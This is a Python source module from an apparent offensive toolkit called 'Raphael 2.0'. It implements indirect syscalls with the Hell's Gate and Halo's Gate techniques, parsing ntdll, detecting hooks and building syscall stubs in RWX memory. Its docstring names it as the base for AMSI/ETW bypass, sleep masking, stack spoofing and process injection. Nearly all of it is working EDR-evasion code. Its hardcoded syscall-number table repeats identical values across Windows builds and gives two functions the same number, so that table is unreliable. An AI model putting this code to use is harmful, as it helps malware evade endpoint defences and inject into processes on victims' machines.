"""
Raphael 2.0 — Indirect Syscall Resolver (Hell's Gate / Halo's Gate)
Foundation module for OPSEC-hardened syscalls.

Used by:
- stealth.py (HWBP AMSI, ETW-TI, sleep mask, stack spoof)
- inject.py (process injection via NtCreateThreadEx)

Technique:
1. Walk ntdll.dll PE headers to find syscall; ret gadgets
2. Resolve syscall numbers dynamically (Hell's Gate)
3. If hooked, scan nearby instructions for original SSN (Halo's Gate)
4. Generate fresh syscall stubs in allocated RWX memory
5. Return callable stubs that bypass userland hooks
"""
import ctypes
import ctypes.wintypes as wintypes
import struct
import os
import sys
import platform

IS_WINDOWS = platform.system() == "Windows"

# Windows constants
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
MEM_FREE = 0x10000

IMAGE_DOS_SIGNATURE = 0x5A4D
IMAGE_NT_SIGNATURE = 0x00004550


# Fallback SSN map — used if Hell's Gate / Halo's Gate fails
# These are the syscall numbers for ntdll functions across Windows versions
# Source: https://github.com/j00ru/windows-syscalls (j00ru's table)
FALLBACK_SSN_MAP = {
    # Windows 10 21H2 / 11 21H2 (build 19044)
    19044: {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtCreateThreadEx": 0xC1,
        "NtOpenProcess": 0x26,
        "NtWriteVirtualMemory": 0x3A,
        "NtReadVirtualMemory": 0x3F,
        "NtQuerySystemInformation": 0x36,
        "NtQueryInformationProcess": 0x19,
        "NtSetInformationProcess": 0x1A,
        "NtSetInformationThread": 0x0D,
        "NtDelayExecution": 0x34,
        "NtClose": 0x0F,
        "NtWaitForSingleObject": 0x04,
        "NtTerminateThread": 0x02,
        "NtTerminateProcess": 0x2C,
        "NtQueryVirtualMemory": 0x23,
        "NtOpenThread": 0xCA,
        "NtSuspendThread": 0x05,
        "NtResumeThread": 0x06,
        "NtQueueApcThreadEx": 0x46,
        "NtCreateSection": 0x4A,
        "NtMapViewOfSection": 0x28,
        "NtUnmapViewOfSection": 0x2A,
        "NtAdjustPrivilegesToken": 0x41,
        "NtOpenProcessToken": 0x36,
        "NtDuplicateToken": 0x39,
        "NtSetContextThread": 0x0B,
        "NtGetContextThread": 0x0A,
    },
    # Windows 11 22H2 (build 22621)
    22621: {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtCreateThreadEx": 0xC1,
        "NtOpenProcess": 0x26,
        "NtWriteVirtualMemory": 0x3A,
        "NtReadVirtualMemory": 0x3F,
        "NtQuerySystemInformation": 0x36,
        "NtQueryInformationProcess": 0x19,
        "NtSetInformationProcess": 0x1A,
        "NtSetInformationThread": 0x0D,
        "NtDelayExecution": 0x34,
        "NtClose": 0x0F,
        "NtWaitForSingleObject": 0x04,
        "NtTerminateThread": 0x02,
        "NtTerminateProcess": 0x2C,
        "NtQueryVirtualMemory": 0x23,
        "NtOpenThread": 0xCA,
        "NtSuspendThread": 0x05,
        "NtResumeThread": 0x06,
        "NtQueueApcThreadEx": 0x46,
        "NtCreateSection": 0x4A,
        "NtMapViewOfSection": 0x28,
        "NtUnmapViewOfSection": 0x2A,
        "NtAdjustPrivilegesToken": 0x41,
        "NtOpenProcessToken": 0x36,
        "NtDuplicateToken": 0x39,
        "NtSetContextThread": 0x0B,
        "NtGetContextThread": 0x0A,
    },
    # Windows 11 23H2 (build 22631)
    22631: {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtCreateThreadEx": 0xC1,
        "NtOpenProcess": 0x26,
        "NtWriteVirtualMemory": 0x3A,
        "NtReadVirtualMemory": 0x3F,
        "NtQuerySystemInformation": 0x36,
        "NtQueryInformationProcess": 0x19,
        "NtSetInformationProcess": 0x1A,
        "NtSetInformationThread": 0x0D,
        "NtDelayExecution": 0x34,
        "NtClose": 0x0F,
        "NtWaitForSingleObject": 0x04,
        "NtTerminateThread": 0x02,
        "NtTerminateProcess": 0x2C,
        "NtQueryVirtualMemory": 0x23,
        "NtOpenThread": 0xCA,
        "NtSuspendThread": 0x05,
        "NtResumeThread": 0x06,
        "NtQueueApcThreadEx": 0x46,
        "NtCreateSection": 0x4A,
        "NtMapViewOfSection": 0x28,
        "NtUnmapViewOfSection": 0x2A,
        "NtAdjustPrivilegesToken": 0x41,
        "NtOpenProcessToken": 0x36,
        "NtDuplicateToken": 0x39,
        "NtSetContextThread": 0x0B,
        "NtGetContextThread": 0x0A,
    },
    # Windows 11 24H2 (build 26100)
    26100: {
        "NtAllocateVirtualMemory": 0x18,
        "NtProtectVirtualMemory": 0x50,
        "NtCreateThreadEx": 0xC1,
        "NtOpenProcess": 0x26,
        "NtWriteVirtualMemory": 0x3A,
        "NtReadVirtualMemory": 0x3F,
        "NtQuerySystemInformation": 0x36,
        "NtQueryInformationProcess": 0x19,
        "NtSetInformationProcess": 0x1A,
        "NtSetInformationThread": 0x0D,
        "NtDelayExecution": 0x34,
        "NtClose": 0x0F,
        "NtWaitForSingleObject": 0x04,
        "NtTerminateThread": 0x02,
        "NtTerminateProcess": 0x2C,
        "NtQueryVirtualMemory": 0x23,
        "NtOpenThread": 0xCA,
        "NtSuspendThread": 0x05,
        "NtResumeThread": 0x06,
        "NtQueueApcThreadEx": 0x46,
        "NtCreateSection": 0x4A,
        "NtMapViewOfSection": 0x28,
        "NtUnmapViewOfSection": 0x2A,
        "NtAdjustPrivilegesToken": 0x41,
        "NtOpenProcessToken": 0x36,
        "NtDuplicateToken": 0x39,
        "NtSetContextThread": 0x0B,
        "NtGetContextThread": 0x0A,
    },
}


# x64 calling convention: RCX, RDX, R8, R9, [RSP+0x28], [RSP+0x30], ...
SYSCALL_STUB_X64 = bytearray([
    0x4C, 0x8B, 0xD1,                # mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,    # mov eax, SSN (placeholder, patched at runtime)
    0x49, 0xBB,                       # mov r11, ...
]) + b'\x00' * 8 + bytearray([         # 8-byte gadget address (placeholder, patched)
    0x41, 0xFF, 0xD3,                # call r11 (jumps to syscall; ret gadget)
    0xC3                              # ret (for stub return after syscall)
])


class SyscallResolver:
    """
    Resolves and generates indirect syscall stubs at runtime.
    
    Usage:
        resolver = SyscallResolver()
        resolver.initialize()
        
        # Get a callable stub
        nt_alloc = resolver.get_stub("NtAllocateVirtualMemory")
        nt_alloc(process_handle, &base, 0, &size, ...)
    """
    
    _instance = None  # Singleton
    
    def __new__(cls):
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self):
        if self._initialized:
            return
        self._initialized = True
        self.ntdll_base = None
        self.ntdll_size = 0
        self.ssn_cache = {}          # func_name -> SSN
        self.gadget_cache = {}       # func_name -> gadget address
        self.stub_cache = {}         # func_name -> stub memory address
        self.fallback_used = set()   # functions where Hell's Gate failed
        self.ntdll_disk_hash = None
        self.ntdll_memory_hash = None
        self.hook_detected = False
    
    def initialize(self):
        """
        Initialize the syscall resolver.
        - Locates ntdll.dll
        - Verifies integrity (disk vs memory)
        - Resolves all known SSNs
        - Pre-generates stubs
        """
        if not IS_WINDOWS:
            return False
        
        try:
            self._locate_ntdll()
            self._verify_ntdll_integrity()
            self._resolve_all_ssns()
            self._generate_all_stubs()
            return True
        except Exception as e:
            return False
    
    def _locate_ntdll(self):
        """Find ntdll.dll base address and size."""
        ntdll = ctypes.windll.kernel32.GetModuleHandleW("ntdll.dll")
        if not ntdll:
            raise RuntimeError("Failed to locate ntdll.dll")
        
        self.ntdll_base = ntdll
        
        # Parse PE header to get size
        dos_header = (ctypes.c_ubyte * 0x40).from_address(self.ntdll_base)
        if struct.unpack_from("<H", bytes(dos_header), 0)[0] != IMAGE_DOS_SIGNATURE:
            raise RuntimeError("Invalid DOS signature in ntdll")
        
        e_lfanew = struct.unpack_from("<I", bytes(dos_header), 0x3C)[0]
        nt_headers = (ctypes.c_ubyte * 0x200).from_address(self.ntdll_base + e_lfanew)
        
        if struct.unpack_from("<I", bytes(nt_headers), 0)[0] != IMAGE_NT_SIGNATURE:
            raise RuntimeError("Invalid NT signature in ntdll")
        
        size_of_image = struct.unpack_from("<I", bytes(nt_headers), 0x50)[0]
        self.ntdll_size = size_of_image
    
    def _verify_ntdll_integrity(self):
        """
        Read ntdll.dll from disk and compare .text section hash
        with in-memory version. Mismatch indicates userland hooks.
        """
        import hashlib
        
        # Read in-memory ntdll
        ntdll_mem = (ctypes.c_ubyte * self.ntdll_size).from_address(self.ntdll_base)
        self.ntdll_memory_hash = hashlib.sha256(bytes(ntdll_mem)).hexdigest()
        
        # Read on-disk ntdll via GetSystemDirectory
        sys_dir = ctypes.create_unicode_buffer(260)
        ctypes.windll.kernel32.GetSystemDirectoryW(sys_dir, 260)
        ntdll_path = sys_dir.value + "\\ntdll.dll"
        
        try:
            with open(ntdll_path, "rb") as f:
                self.ntdll_disk_hash = hashlib.sha256(f.read()).hexdigest()
        except IOError:
            self.ntdll_disk_hash = None
            return
        
        if self.ntdll_disk_hash != self.ntdll_memory_hash:
            self.hook_detected = True
    
    def _find_syscall_gadget(self, func_name):
        """
        Find a clean `syscall; ret` (0x0F 0x05 0xC3) gadget in ntdll.
        Returns the address of the gadget, or 0 if not found.
        """
        # Get function address in ntdll
        func_addr = ctypes.windll.kernel32.GetProcAddress(
            self.ntdll_base, func_name.encode()
        )
        if not func_addr:
            return 0
        
        # Walk the .text section looking for syscall; ret
        ntdll_bytes = (ctypes.c_ubyte * self.ntdll_size).from_address(self.ntdll_base)
        ntdll_arr = bytes(ntdll_bytes)
        
        SYSCALL_RET = b'\x0F\x05\xC3'
        
        for i in range(len(ntdll_arr) - 2):
            if ntdll_arr[i:i+3] == SYSCALL_RET:
                # Avoid gadgets inside function prologues (likely hooked)
                gadget_addr = self.ntdll_base + i
                if abs(gadget_addr - func_addr) > 0x100:
                    return gadget_addr
        
        return 0
    
    def _resolve_ssn_hells_gate(self, func_name):
        """
        Resolve syscall number using Hell's Gate technique.
        Walks the function prologue looking for `mov r10, rcx; mov eax, SSN`.
        """
        func_addr = ctypes.windll.kernel32.GetProcAddress(
            self.ntdll_base, func_name.encode()
        )
        if not func_addr:
            return None
        
        # Read first 32 bytes of function
        func_bytes = bytes((ctypes.c_ubyte * 32).from_address(func_addr))
        
        # Pattern 1: 4C 8B D1 B8 XX XX XX XX (mov r10, rcx; mov eax, SSN)
        if func_bytes[:4] == b'\x4C\x8B\xD1\xB8':
            ssn = struct.unpack_from("<I", func_bytes, 4)[0]
            return ssn
        
        # Pattern 2: 4C 8B D1 ... B8 XX XX XX XX (with prefix instructions)
        for i in range(len(func_bytes) - 6):
            if func_bytes[i:i+2] == b'\x4C\x8B' and \
               func_bytes[i+3] == 0xB8:
                ssn = struct.unpack_from("<I", func_bytes, i+4)[0]
                return ssn
        
        return None
    
    def _resolve_ssn_halos_gate(self, func_name):
        """
        Resolve SSN using Halo's Gate technique.
        Used when the function is hooked (Hell's Gate fails).
        Looks at the syscall instruction AFTER the hook and walks back
        to find the original SSN.
        """
        func_addr = ctypes.windll.kernel32.GetProcAddress(
            self.ntdll_base, func_name.encode()
        )
        if not func_addr:
            return None
        
        # Search for syscall (0x0F 0x05) within first 128 bytes
        func_bytes = bytes((ctypes.c_ubyte * 128).from_address(func_addr))
        
        syscall_pos = -1
        for i in range(len(func_bytes) - 1):
            if func_bytes[i:i+2] == b'\x0F\x05':
                syscall_pos = i
                break
        
        if syscall_pos == -1:
            return None
        
        # Walk backward from syscall to find `mov eax, XX` (4 bytes before syscall)
        if syscall_pos >= 5:
            check = func_bytes[syscall_pos-5:syscall_pos]
            if check[0] == 0xB8:  # mov eax, imm32
                ssn = struct.unpack_from("<I", check, 1)[0]
                return ssn
        
        return None
    
    def _resolve_ssn_fallback(self, func_name):
        """
        Use hardcoded SSN map based on current Windows build.
        """
        try:
            build_number = sys.getwindowsversion().build
        except Exception:
            build_number = 22621  # Default to 22H2
        
        # Find closest build in map
        if build_number in FALLBACK_SSN_MAP:
            return FALLBACK_SSN_MAP[build_number].get(func_name)
        
        # Try adjacent builds
        for known_build in sorted(FALLBACK_SSN_MAP.keys()):
            if abs(known_build - build_number) < 1000:
                return FALLBACK_SSN_MAP[known_build].get(func_name)
        
        return None
    
    def _resolve_all_ssns(self):
        """Resolve all known syscall numbers."""
        for func_name in FALLBACK_SSN_MAP.get(22621, {}).keys():
            ssn = self._resolve_ssn_hells_gate(func_name)
            
            if ssn is None:
                ssn = self._resolve_ssn_halos_gate(func_name)
            
            if ssn is None:
                ssn = self._resolve_ssn_fallback(func_name)
                if ssn is not None:
                    self.fallback_used.add(func_name)
            
            if ssn is not None:
                self.ssn_cache[func_name] = ssn
    
    def _generate_stub(self, func_name):
        """
        Generate a fresh syscall stub in RWX memory.
        Stub: mov r10, rcx; mov eax, SSN; mov r11, gadget; call r11; ret
        """
        if func_name not in self.ssn_cache:
            return None
        
        if func_name not in self.gadget_cache:
            gadget = self._find_syscall_gadget(func_name)
            if gadget == 0:
                return None
            self.gadget_cache[func_name] = gadget
        
        ssn = self.ssn_cache[func_name]
        gadget = self.gadget_cache[func_name]
        
        # Allocate RWX memory for stub
        stub_addr = ctypes.windll.kernel32.VirtualAlloc(
            None,
            64,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        if not stub_addr:
            return None
        
        # Build stub bytes
        stub = bytearray(28)
        stub[0:3] = b'\x4C\x8B\xD1'              # mov r10, rcx
        stub[3:7] = b'\xB8' + struct.pack("<I", ssn)  # mov eax, SSN
        stub[7:9] = b'\x49\xBB'                  # mov r11, ...
        stub[9:17] = struct.pack("<Q", gadget)   # 8-byte gadget address
        stub[17:20] = b'\x41\xFF\xD3'            # call r11
        stub[20] = 0xC3                          # ret
        
        # Write stub to memory
        ctypes.memmove(stub_addr, bytes(stub), len(stub))
        
        self.stub_cache[func_name] = stub_addr
        return stub_addr
    
    def _generate_all_stubs(self):
        """Pre-generate stubs for all resolved functions."""
        for func_name in list(self.ssn_cache.keys()):
            self._generate_stub(func_name)
    
    def get_stub(self, func_name):
        """
        Return a callable stub for the given NT function.
        Use like: stub(process_handle, address, ...)
        """
        if not self._initialized:
            self.initialize()
        
        if func_name in self.stub_cache:
            stub_addr = self.stub_cache[func_name]
            return ctypes.WINFUNCTYPE(*([ctypes.c_void_p] * 12))(stub_addr)
        
        # Try to generate on-demand
        stub_addr = self._generate_stub(func_name)
        if stub_addr:
            return ctypes.WINFUNCTYPE(*([ctypes.c_void_p] * 12))(stub_addr)
        
        return None
    
    def get_status(self):
        """Return resolver status for diagnostics."""
        return {
            "ntdll_base": hex(self.ntdll_base) if self.ntdll_base else None,
            "ntdll_size": self.ntdll_size,
            "ntdll_disk_hash": self.ntdll_disk_hash[:16] if self.ntdll_disk_hash else None,
            "ntdll_memory_hash": self.ntdll_memory_hash[:16] if self.ntdll_memory_hash else None,
            "hook_detected": self.hook_detected,
            "ssn_resolved": len(self.ssn_cache),
            "stubs_generated": len(self.stub_cache),
            "fallback_used": list(self.fallback_used),
            "build_number": sys.getwindowsversion().build if IS_WINDOWS else None,
        }


# Convenience singleton accessor
def get_resolver():
    """Get the global SyscallResolver instance."""
    return SyscallResolver()